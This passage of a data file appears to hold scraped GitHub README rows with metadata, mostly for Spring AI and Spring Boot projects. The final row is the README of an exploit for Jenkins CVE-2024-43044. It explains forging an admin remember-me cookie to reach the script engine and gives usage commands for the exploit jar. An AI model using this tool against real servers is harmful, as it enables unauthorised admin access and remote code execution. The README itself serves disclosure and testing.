    public String home(@RequestParam String message) {
        return chatClient.prompt()
                .user(message)
                .call()
                .content();
    }

}
```

Run the previous example and let the LLM know what your name is and then send a follow-up request asking the LLM if it remembers your name. Try running this example by commenting out the `defaultAdvisors()` line of code. 

```shell
http :8080/chat message==""My name is Dan, how are you doing today?""
```

```shell
http :8080/chat message==""What is my name?""
```

### Prompts

Prompts serve as the foundation for the language-based inputs that guide an AI model to produce specific outputs. For those familiar with ChatGPT, a prompt might seem like merely the text entered into a dialog box that is sent to the API. However, it encompasses much more than that. In many AI Models, the text for the prompt is not just a simple string.

You might have heard the term ""Prompt Engineering"" which I'm not a very big fan of but the idea behind it is. Really what we are talking about here is learning how to effectively communicate with an AI model. It is such an import part building AI powered applications and getting your desired output from an LLM.

- [Prompt Engineering Guidelines from Open AI](https://platform.openai.com/docs/guides/prompt-engineering)
- [Deep Learning: GhatGPT Prompt Engineering for Developers](https://www.deeplearning.ai/short-courses/chatgpt-prompt-engineering-for-developers/)

```java
@RestController
public class TreasureController {

    private final ChatClient chatClient;
    
    public TreasureController(ChatClient.Builder builder) {
        this.chatClient = builder
                .defaultSystem(""Please respond to any question in the voice of a pirate."")
                .build();
    }
    
    @GetMapping(""/treasure"")
    public String treasureFacts() {
        return chatClient.prompt()
                .user(""Tell me a really interesting fact about famous pirate treasures. Please keep your answer to 1 or 2 sentences."")
                .call()
                .content();
    }
}
```

```java
@RestController
@RequestMapping(""/youtube"")
public class YouTube {

    private final ChatClient chatClient;
    @Value(""classpath:/prompts/youtube.st"")
    private Resource ytPromptResource;

    public YouTube(ChatClient.Builder builder) {
        this.chatClient = builder.build();
    }

    @GetMapping(""/popular"")
    public String findPopularYouTubersStepOne(@RequestParam(value = ""genre"", defaultValue = ""tech"") String genre) {
        String message = """"""
            List 10 of the most popular YouTubers in {genre} along with their current subscriber counts. If you don't know
            the answer , just say ""I don't know"".
            """""";

        return chatClient.prompt()
                .user(u -> u.text(message).param(""genre"",genre))
                .call()
                .content();
    }

    @GetMapping(""/popular-resource"")
    public String findPopularYouTubers(@RequestParam(value = ""genre"", defaultValue = ""tech"") String genre) {
        return chatClient.prompt()
                .user(u -> u.text(ytPromptResource).param(""genre"",genre))
                .call()
                .content();
    }

}
```

### Structured Output 

The ability of LLMs to produce structured outputs is important for downstream applications that rely on reliably parsing output values. Developers want to quickly turn results from an AI model into data types, such as JSON, XML or Java Classes, that can be passed to other application functions and methods.

https://docs.spring.io/spring-ai/reference/api/structured-output-converter.html

```java
public record ActorFilms(String actor, List<String> movies) {}
```

```java
@RestController
public class ActorController {

    private final ChatClient chatClient;

    public ActorController(ChatClient.Builder builder) {
        this.chatClient = builder
                .build();
    }

    @GetMapping(""/films"")
    public ActorFilms getActorFilms() {
        return chatClient.prompt()
                .user(""Generate a filmography for a Anthony Hopkins."")
                .call()
                .entity(ActorFilms.class);
    }

    @GetMapping(""/films-list"")
    public List<ActorFilms> listActorFilms() {
        return chatClient.prompt()
                .user(""Generate a filmography for the actors Denzel Washington, Leonardo DiCaprio and Tom Hanks"")
                .call()
                .entity(new ParameterizedTypeReference<>() {});
    }

}
```

### Bring your own data

How can you equip the AI model with information on which it has not been trained? Note that the GPT 3.5/4.0 dataset extends only until September 2021. Consequently, the model says that it does not know the answer to questions that require knowledge beyond that date. 

There is also the point that an LLM is not trained on your company data that it does not have access to. Three techniques exist for customizing the AI model to incorporate your data:

**Fine Tuning**: This traditional machine learning technique involves tailoring the model and changing its internal weighting. However, it is a challenging process for machine learning experts and extremely resource-intensive for models like GPT due to their size. Additionally, some models might not offer this option.

**Prompt Stuffing**: A more practical alternative involves embedding your data within the prompt provided to the model. Given a modelâ€™s token limits, techniques are required to present relevant data within the modelâ€™s context window. This approach is colloquially referred to as â€œstuffing the prompt.â€ The Spring AI library helps you implement solutions based on the â€œstuffing the promptâ€ technique otherwise known as Retrieval Augmented Generation (RAG).

**Function Calling**: This technique allows registering custom, user functions that connect the large language models to the APIs of external systems. Spring AI greatly simplifies code you need to write to support function calling.

#### Retrieval Augmented Generation (RAG)

A technique termed Retrieval Augmented Generation (RAG) has emerged to address the challenge of incorporating relevant data into prompts for accurate AI model responses. The approach involves a batch processing style programming model, where the job reads unstructured data from your documents, transforms it, and then writes it into a vector database. At a high level, this is an ETL (Extract, Transform and Load) pipeline. The vector database is used in the retrieval part of RAG technique.

**Vector Stores**

A vector databases is a specialized type of database that plays an essential role in AI applications. In vector databases, queries differ from traditional relational databases. Instead of exact matches, they perform similarity searches. When given a vector as a query, a vector database returns vectors that are â€œsimilarâ€ to the query vector. 

Spring AI provides support for a number of Vector Databases through Auto-Configuration. Here are a few of the supported vector databases if you want to see a full list please go [here](https://docs.spring.io/spring-ai/reference/api/vectordbs.html#_available_implementations). 

- PgVector Store
- Azure Vector Search
- Oracle Vector Store
- Redis Vector Store
- SimpleVectorStore

**Embeddings**

Embeddings transform text into numerical arrays or vectors, enabling AI models to process and interpret language data. This transformation from text to numbers is a key element in how AI interacts with and understands human language.

![Embeddings](/images/embeddings.png)

#### Bring you own data Demos

- **Stuffing the Prompt**: `stuff/Olympics.java`
- **RAG**: `/rag/FaqController.java`
- **Functions**: `/functions/CityController.java`

### Multimodal API

Humans process knowledge, simultaneously across multiple modes of data inputs. The way we learn, our experiences are all multimodal. We donâ€™t have just vision, just audio and just text. In the previous examples we took in some text and generated some text. In this example you will use an image as the input and generate some text as the output. 

```java
@RestController
public class ImageDetection {

    private final ChatClient chatClient;
    @Value(""classpath:/images/sincerely-media-2UlZpdNzn2w-unsplash.jpg"")
    Resource sampleImage;

    public ImageDetection(ChatClient.Builder builder) {
        this.chatClient = builder.build();
    }

    @GetMapping(""/image-to-text"")
    public String image() throws IOException {
        return chatClient.prompt()
                .user(u -> u
                        .text(""Can you please explain what you see in the following image?"")
                        .media(MimeTypeUtils.IMAGE_JPEG,sampleImage)
                )
                .call()
                .content();
    }
}
```",0,0,4,0.0,"['spring', 'ai', 'workshop', 'agenda', 'artificial', 'intelligence', 'ai', 'supervise', 'learn', 'unsupervised', 'learn', 'large', 'language', 'model', 'llm', 'model', 'token', 'ai', 'rest', 'endpoint', 'spring', 'ai', 'documentation', 'getting', 'start', 'chat', 'client', 'chat', 'memory', 'prompt', 'structure', 'output', 'bring', 'data', 'retrieval', 'augmented', 'generation', 'rag', 'bring', 'data', 'demo', 'multimodal', 'api']","['ai', 'spring', 'learn', 'model', 'chat']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
ngntu10/OptiMart,main,"# OptiMart

## Requirements

For building and running the application you need:

- [Node 20 & Npm 10](https://nodejs.org/en/download)
- [JDK 17](https://www.oracle.com/java/technologies/downloads/#java21)
- [Maven 3](https://maven.apache.org)

[//]: # ()
[//]: # (## Run the application locally)

[//]: # ()
[//]: # (Install the dependencies:)

[//]: # ()
[//]: # (``` bash)

[//]: # (npm install)

[//]: # (npm run prepare)

[//]: # (```)

[//]: # ()
[//]: # (Make sure to connect to your databse by defining the env file `env.properties` located in `/src/main/resources/`. For example:)

[//]: # ()
[//]: # (``` properties)

[//]: # (# /src/main/resources/env.properties)

[//]: # (DB_DDL_AUTO=update)

[//]: # (DB_URL=jdbc:postgresql://localhost:5432/postgres)

[//]: # (DB_USERNAME=your_username)

[//]: # (DB_PASSWORD=your_password)

[//]: # (```)

[//]: # ()
[//]: # (Run the server:)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn spring-boot:run)

[//]: # (```)

[//]: # ()
[//]: # (Use a browser to navigate to [http://localhost:8080/swagger-ui/index.html]&#40;http://localhost:8080/api/v1/swagger-ui/index.html&#41;.)

[//]: # ()
[//]: # (## Run tests)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn test)

[//]: # (```)

[//]: # ()
[//]: # (## Other commands)

[//]: # ()
[//]: # (### Format code)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn fmt:format)

[//]: # (```)

[//]: # (## How to name a branch?)

[//]: # ()
[//]: # (Branch name pattern:)

[//]: # ()
[//]: # ()
[//]: # (```text)

[//]: # (type/description-in-kebab-case)

[//]: # ()
[//]: # (type/issue-#{issue_number})

[//]: # ()
[//]: # (```)

[//]: # ()
[//]: # (Examples:)

[//]: # ()
[//]: # (```text)

[//]: # (feature/issue-#99)

[//]: # (```)

[//]: # ()
[//]: # (```text)

[//]: # (hotfix/quick-fix-for-an-emergency)

[//]: # (```)

[//]: # ()
[//]: # (Common types according to [simplified convention for naming branches]&#40;https://dev.to/varbsan/a-simplified-convention-for-naming-branches-and-commits-in-git-il4&#41;)

[//]: # (- feature: adding, refactoring or removing a feature)

[//]: # (- bugfix: fixing a bug)

[//]: # (- hotfix: changing code with a temporary solution and/or without following the usual process &#40;usually because of an emergency&#41;)

[//]: # (- test: experimenting outside of an issue/ticket)

[//]: # ()

## How to name a commit message?

**Commitlint** checks if your commit messages meet the [conventional commit format](https://conventionalcommits.org).

Commit message pattern:

```sh
type(scope?): subject  #scope is optional; multiple scopes are supported (current delimiter options: ""/"", ""\"" and "","")
```

Examples:

```text
chore: run tests on travis ci
```

```text
fix(server): send cors headers
```

```text
feat(blog): add comment section
```

Common types according to [commitlint-config-conventional (based on the Angular convention)](https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum) can be:

- build
- chore
- ci
- docs
- feat
- fix
- perf
- refactor
- revert
- style
- test

[//]: # (## References)

[//]: # ()
[//]: # (Read these references if needed:)

[//]: # ()
[//]: # (- [Open api swagger]&#40;https://springdoc.org/&#41;)

[//]: # (- [Lombok]&#40;https://codippa.com/lombok/&#41;)

[//]: # (- [JPA/Hibernate entity relationships]&#40;https://www.baeldung.com/jpa-hibernate-associations&#41;)

[//]: # (- [Hibernate type mappings]&#40;https://vladmihalcea.com/a-beginners-guide-to-hibernate-types/&#41;)",0,1,2,1.0,"['optimart', 'requirement', 'run', 'application', 'locally', 'install', 'dependency', 'bash', 'npm', 'install', 'npm', 'run', 'prepare', 'make', 'sure', 'connect', 'databse', 'define', 'env', 'file', 'locate', 'for', 'example', 'property', 'postgresql', 'run', 'server', 'bash', 'mvn', 'run', 'use', 'browser', 'navigate', 'http', 'http', 'run', 'test', 'bash', 'mvn', 'test', 'other', 'command', 'format', 'code', 'bash', 'mvn', 'fmt', 'format', 'how', 'name', 'branch', 'branch', 'name', 'pattern', 'text', 'example', 'text', 'text', 'common', 'type', 'accord', 'simplify', 'convention', 'name', 'branch', 'http', 'feature', 'add', 'refactoring', 'remove', 'feature', 'bugfix', 'fixing', 'bug', 'hotfix', 'changing', 'code', 'temporary', 'solution', 'without', 'follow', 'usual', 'process', 'usually', 'emergency', 'test', 'experimenting', 'outside', 'how', 'name', 'commit', 'message', 'reference', 'read', 'reference', 'need', 'open', 'api', 'swagger', 'http', 'lombok', 'http', 'entity', 'relationship', 'http', 'hibernate', 'type', 'mapping', 'http']","['http', 'run', 'bash', 'name', 'mvn']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[ä¸­æ–‡ç‰ˆæœ¬](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started
Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

1. Add 'spring-ai-alibaba-starter' dependency to your project.

```xml
<dependency>
	<groupId>com.alibaba.cloud.ai</groupId>
	<artifactId>spring-ai-alibaba-starter</artifactId>
	<version>1.0.0-M2</version>
</dependency>
```

> NOTICE! Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
>
> ```xml
> <repositories>
> 	<repository>
> 		<id>spring-milestones</id>
> 		<name>Spring Milestones</name>
> 		<url>https://repo.spring.io/milestone</url>
> 		<snapshots>
> 			<enabled>false</enabled>
> 		</snapshots>
> 	</repository>
> </repositories>
> ```

2. Inject the default `ChatClient` Bean to regular Controller beans.

```java
@RestController
public class ChatController {

	private final ChatClient chatClient;

	public ChatController(ChatClient.Builder builder) {
		this.chatClient = builder.build();
	}

	@GetMapping(""/chat"")
	public String chat(String input) {
		return this.chatClient.prompt()
				.user(input)
				.call()
				.content();
	}
}
```

## Examples
More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

![ai-native-architecture](./docs/imgs/spring-ai-alibaba-arch.png)

## References
* [Spring AI](https://docs.spring.io/spring-ai/reference/index.html)
* [Alibaba Cloud Dashscope Model Service Platform (é˜¿é‡Œäº‘ç™¾ç‚¼æ¨¡å‹æœåŠ¡åŠåº”ç”¨å¼€å‘å¹³å°)](https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/)

## Contact Us
* Dingtalk Group (é’‰é’‰ç¾¤), search `64485010179` and join.
* Wechat Group (å¾®ä¿¡å…¬ä¼—å·), scan the QR code below and follow us.

<img src=""./docs/imgs/wechat-account.jpg"" style=""max-width:100px;""/>

",1,4,1,27.0,"['spring', 'ai', 'alibaba', 'http', 'get', 'start', 'example', 'core', 'feature', 'roadmap', 'reference', 'contact', 'u']","['spring', 'ai', 'alibaba', 'http', 'get']",11.0,"[com.mycila:license-maven-plugin,com.vaadin:vaadin-maven-plugin,io.spring.javaformat:spring-javaformat-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,9.0,2.0
bty834/spring-tx-message,main,"
# Quick Start

1. add dependency

```xml
   <dependency>
            <groupId>io.github.bty834</groupId>
            <artifactId>spring-tx-message</artifactId>
            <version>0.0.1-SNAPSHOT</version>
   </dependency>
```

2. create table and configure adapter and repository

```sql
CREATE TABLE `your_table_name`
(
    `id`              bigint       NOT NULL AUTO_INCREMENT,
    `number`          bigint       NOT NULL ,
    `topic`           varchar(255) NOT NULL,
    `sharding_key`    varchar(255)          DEFAULT NULL,
    `msg_id`          varchar(255)          DEFAULT NULL,
    `send_status`     tinyint      NOT NULL DEFAULT '0',
    `content`         longtext     NOT NULL,
    `retry_times`     tinyint      NOT NULL DEFAULT '0',
    `next_retry_time` datetime     NOT NULL,
    `deleted`         tinyint      NOT NULL DEFAULT '0',
    `create_time`     datetime     NOT NULL DEFAULT CURRENT_TIMESTAMP,
    `update_time`     datetime     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    KEY `number` (`number`),
    KEY `idx_createtime` (`create_time`),
    KEY `idx_msgid` (`msg_id`),
    KEY `idx_updatetime` (`update_time`),
    KEY `idx_nextretrytime_retrytimes_sendstatus_deleted` (`send_status`,`next_retry_time`, `retry_times`, `deleted`)
) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4
```

```java
import io.github.bty834.springtxmessage.utils.SnowFlake;
import org.springframework.context.annotation.Bean;

@Configuration
public class TxMessageConfig {
    @Bean
    public TxMessageSendAdapter txMessageSendAdapter() {
        return new MyMessageSendAdapter();
    }

    @Bean
    public TxMessageRepository txMessageRepository(DataSource dataSource) {
        // your_table_name is your table name 
        return new TxMessageRepository(dataSource, ""your_table_name"");
    }

    @Bean
    public SnowFlake snowFlake() {
        // pod unique
        return new SnowFlake(1,1);
    }
}

/**
 * your send adapter
 */
class MyMessageSendAdapter implements TxMessageSendAdapter {

    // ...

    @Override
    public TxMessageSendResult send(TxMessage txMessage) {
        // your adapter logic
        TxMessageSendResult sendResult = new TxMessageSendResult();
        sendResult.setMsgId(""xxx"");
        sendResult.setSuccess(true);
        return sendResult;
    }
}
```

3. enable and use it: save or try send

set `spring.tx.message.send.enabled = true` to enable save and try send

set `spring.tx.message.send.enabled = false` to not save and sync send

```java
    @Autowired
    TxMessageSender txMessageSender;

    public void sendMsg(TxMessage txMessage) {
        // save but don't retry send
        txMessageSender.batchSave(Collections.singletonList(txMessage));
        txMessageSender.saveAndTrySend(txMessage);
        txMessageSender.batchSaveAndTrySend(Collections.singletonList(txMessage));
    }
```

4. enabled use it: compensate send

set `spring.tx.message.compensate.send.enabled = true` to enable compensate send

   set `spring.tx.message.compensate.interval.seconds`  to customize compensate intervals
```java
    @Autowired
    TxMessageCompensateSender compensateSender;
    
    public void compensateSend() {
        // send with retry times = 4, when reaches max retry times , it will log.error and don't compensate send
        compensateSender.send(4);
        
        compensateSender.sendByNumberIgnoreStatus(1L);
        compensateSender.sendByMsgIdIgnoreStatus(""xxx"");
        
    }
```
",0,0,1,0.0,"['quick', 'start']","['quick', 'start']",1.0,[org.apache.maven.plugins:maven-compiler-plugin],0.0,1.0,0.0
Lunatix01/ragscan,master,"Simple CLI Retrieval Augmented Generation Scanner
=================================================
Aim of the project: A showcase of a RAG scanner written in Java and using [Spring AI](https://docs.spring.io/spring-ai/reference/api/index.html), which scans the targeted documents and you can ask questions to the LLM regarding the given documents.

## Disclaimer
This tool is intended for educational and productivity purposes only. It is designed to assist users in managing and querying their own documents. Any illegal or unethical use of this software is strictly prohibited.

## Requirements
1. [Java 21](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html) installed on your device
2. [Docker](https://www.docker.com/products/docker-desktop/)
3. An environment variable named `GOOGLE_API_KEY` and add your [Google Gemini API key](https://ai.google.dev/gemini-api/docs/api-key)

## Installation
1. Navigate to the project directory
2. Open CMD/Powershell/Terminal
3. For Windows Run `./mvnw clean install`, for Linux/Mac run `./mvn clean install`

## How to use:
1. Run `docker-compose up` in your CMD/Powershell/Terminal
2. Run the project using maven, on Windows: `./mvnw spring-boot:run`, on Linux/Mac run `./mvn spring-boot:run`.
3. When the shell opens type `collection-size 768` (for Gemini `768` is compatible).
4. Place your files in a directory, copy the full path of the directory, and run something like this `load /your/path`, wait till the files are chunked and loaded to `Qdrant vector database`.
5. Finally in the shell write `ask ""your question here""` and that's it.


### Notes
It's a simple project, needs a lot of improvements like: 
1. Improve chunking documents (Currently chunked by token size)
2. Support more file types (Currently supports txt, HTML, JSON, MD, docx, ppt, pdf, and a lot more)
3. Support other Chat models like GPT, Ollama, etc... (currently supports Gemini version `gemini-1.5-flash-latest`, the reason I decided to use Gemini is because it has a good free tier)
4. Support to make it a standalone executable and a jar file, (Currently you can build it yourself and run it, it has no problem, but I will simplify it)
5. Support other vector databases ( Currently supports Qdrant, to be honest, it's good enough)
6. Support custom System Context and custom similar returned documents in DB (Default, for now, is 5.)

#### Rabbit hole
Don't try to retrieve an API key from older `.git` versions, it's a rabbit hole :)

Please create an Issue, if something is wrong I will look into it, and feel free to contribute to the project.
==============
",0,2,2,2.0,"['disclaimer', 'requirement', 'installation', 'how', 'use', 'note', 'rabbit', 'hole']","['disclaimer', 'requirement', 'installation', 'how', 'use']",1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Hindhuja-V/devOps-project,main,"# Real-World DevOps/Cloud Projects For Learning by ProDevOpsGuyâ™

![DevOps-Projects](https://imgur.com/5czbYqE.png)

## DevOps Real World Projects for Aspiring DevOps Engineers [Beginner to Advanced]

### Repository Contents for DevOps Projects from Beginner to Advanced Levels

The repository contains hands-on DevOps projects suitable for individuals at various skill levels, ranging from beginner to advanced.

### Integration of DevOps Technology with Other Technologies

Projects in this repository showcase the integration of DevOps practices with other cutting-edge technologies such as Machine Learning, Git, GitHub, etc.

### Project Scope

The projects included cover a wide array of topics within the DevOps domain, providing practical experience and insights into real-world scenarios.

### Why Explore This Repository?

Whether you're new to DevOps or looking to enhance your skills, this repository offers valuable resources and projects to help you learn and grow in the field.

### Contribute and Collaborate

Feel free to contribute your own DevOps projects or collaborate with others in enhancing existing projects. Let's build a thriving community of DevOps enthusiasts!

## Hit the Star! â­

**If you are planning to use this repository for learning, please give it a star. Thanks!**

### Author by:

![](https://imgur.com/2j6Aoyl.png)

> [!Note]
> Join Our [Telegram Community](https://t.me/prodevopsguy) || [Follow me](https://github.com/NotHarshhaa) for more DevOps Content
",0,0,1,0.0,"['project', 'for', 'learning', 'devops', 'real', 'world', 'project', 'aspiring', 'devops', 'engineer', 'beginner', 'advanced', 'repository', 'content', 'devops', 'project', 'beginner', 'advanced', 'level', 'integration', 'devops', 'technology', 'other', 'technology', 'project', 'scope', 'why', 'explore', 'this', 'repository', 'contribute', 'collaborate', 'hit', 'star', 'author', 'by']","['project', 'devops', 'beginner', 'advanced', 'repository']",5.0,"[maven-checkstyle-plugin,maven-compiler-plugin,maven-javadoc-plugin,maven-jxr-plugin,maven-pmd-plugin,maven-project-info-reports-plugin,maven-release-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,maven-surefire-report-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:findbugs-maven-plugin,org.codehaus.mojo:taglist-maven-plugin,org.jacoco:jacoco-maven-plugin,org.mortbay.jetty:jetty-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",2.0,2.0,1.0
sivaprasadreddy/tomato-architecture-spring-boot-demo,main,"# tomato-architecture-spring-boot-demo
A sample Spring Boot application following [Tomato Architecture](https://github.com/sivaprasadreddy/tomato-architecture)

## Prerequisites
* JDK 21
* Docker Compose

## TechStack
* Java 21
* Spring Boot
* Spring Modulith
* jOOQ
* PostgreSQL
* Kafka
* Testcontainers
* Docker Compose

## How to run?
The application is configured to use Docker Compose to start the dependent services (Postgres, Kafka).
You can simply run `BookStoreApplication.java` from your IDE to start the application.

**NOTE:** To work with Kafka transparently from both local and container, add `127.0.0.1   broker` entry in `/etc/hosts` file.

To know more about Spring Boot Docker Compose Support, you can watch the following video.

[![Spring Boot Docker Compose Support](https://img.youtube.com/vi/PZt5EJTLH4o/0.jpg)](https://www.youtube.com/watch?v=PZt5EJTLH4o)

You can also start the application from commandline as follows:

```shell
$ ./mvnw spring-boot:run
```

## Run tests
You can run the tests as follows:

```shell
$ ./mvnw test
```

The application is using Spring Modulith to verify the module boundaries.
To know more about Spring Modulith, you can watch the following video.

[![Spring Modulith Crash Course : Building Modular Monoliths using Spring Boot](https://img.youtube.com/vi/FkP2aZiBrhg/0.jpg)](https://www.youtube.com/watch?v=FkP2aZiBrhg)

",0,1,1,0.0,"['prerequisite', 'techstack', 'how', 'run', 'run', 'test']","['run', 'prerequisite', 'techstack', 'how', 'test']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,1.0,0.0
xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

![screenshot](https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a)

Dependency Visualization

![dependency_visualization_recording](https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad)

## Features

- Scans Spring Boot projects to identify packages and their relationships
- Calculates abstractness, instability, and distance from the main sequence for each package
- Provides a web interface for easy project analysis
- Visualizes results using an interactive scatter plot
- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

5. View the results in the interactive scatter plot

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D â‰¤ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

",0,0,1,9.0,"['abstractness', 'instability', 'metric', 'calculator', 'feature', 'prerequisite', 'installation', 'usage', 'nix', 'flake', 'understand', 'result', 'instability', 'i', 'abstractness', 'a', 'distance', 'main', 'sequence', 'd', 'interpret', 'scatter', 'plot', 'color', 'cod', 'practical', 'application', 'contribute', 'license']","['abstractness', 'instability', 'metric', 'calculator', 'feature']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
convisolabs/CVE-2024-43044-jenkins,master,"## Intro
This is an exploit for CVE-2024-43044, an arbitrary file read that allows an agent to fetch files from the controller.

The exploit will use the vulnerability to read files to forge a remember-me cookie for an admin account and gain access to
Jenkins scripting engine.

Check out the full writeup at https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/

## Building the exploit
```
mvn package
```

## Running the exploit

```
Exploit Usages:
    java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>
    java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>
    java -jar exploit.jar mode_attach <cmd>
```


## Testing 

You can test it in vulnerable version using docker:

```
docker run -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:2.441-jdk17
```

Once you have a jenkins runnning, setup an agent.

The controller/agent connection can be either default (using url, nodename, secret) or via SSH.

## Demonstration

![RCE](./assets/rce_mode_secret.gif).


## References

https://www.jenkins.io/security/advisory/2024-08-07/
